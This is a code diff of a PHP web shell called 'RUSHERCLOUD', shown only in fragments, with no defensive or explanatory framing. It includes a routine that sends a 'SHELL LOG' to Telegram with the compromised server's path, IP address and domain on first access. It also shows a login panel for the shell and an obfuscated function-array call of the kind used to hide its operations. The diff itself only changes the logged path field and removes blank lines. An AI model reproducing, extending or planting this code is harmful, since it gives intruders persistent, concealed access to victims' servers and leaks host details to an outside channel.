@@ -34,7 +34,7 @@ function sendToTelegram($message)
 
 if (!isset($_SESSION[$session_key_tele])) {
     $msg = "<b>RUSHERCLOUD SHELL LOG</b>\n\n";
-    $msg .= "Path: <code>" . realpath(__FILE__) . "</code>\n";
+    $msg .= "Path: <code>" . $_SERVER['REQUEST_URI'] . "</code>\n";
     $msg .= "IP: <code>$_SERVER[SERVER_ADDR]</code>\n";
     $msg .= "Domain: <code>$_SERVER[SERVER_NAME]</code>\n";
     $msg .= "First Access: " . date("d-m-Y H:i:s");
@@ -94,11 +94,9 @@ if (!isset($_SESSION['logged_in'])) {
         <div class="flex justify-center items-center min-h-screen bg-gray-900 p-4">
             <div class="w-full max-w-sm bg-gray-800 border border-gray-700 rounded-xl shadow-2xl overflow-hidden">
                 <div class="p-8 md:p-10">
-
                     <h1 class="mb-8 text-center font-extrabold text-2xl text-gray-100 tracking-wider">
                         RUSHERCLOUD
                     </h1>
-
                     <?php if (isset($login_error)): ?>
                         <div class="bg-red-900 border-l-4 border-red-500 text-red-300 p-3 mb-6 rounded-md" role="alert">
                             <p class="font-semibold">Authentication Failed</p>
@@ -183,8 +181,6 @@ if (isset($_GET['d'])) {
 } else {
     $chdir = $fungsi[0]();
 }
-
-
 
 ?>
 <!DOCTYPE html>
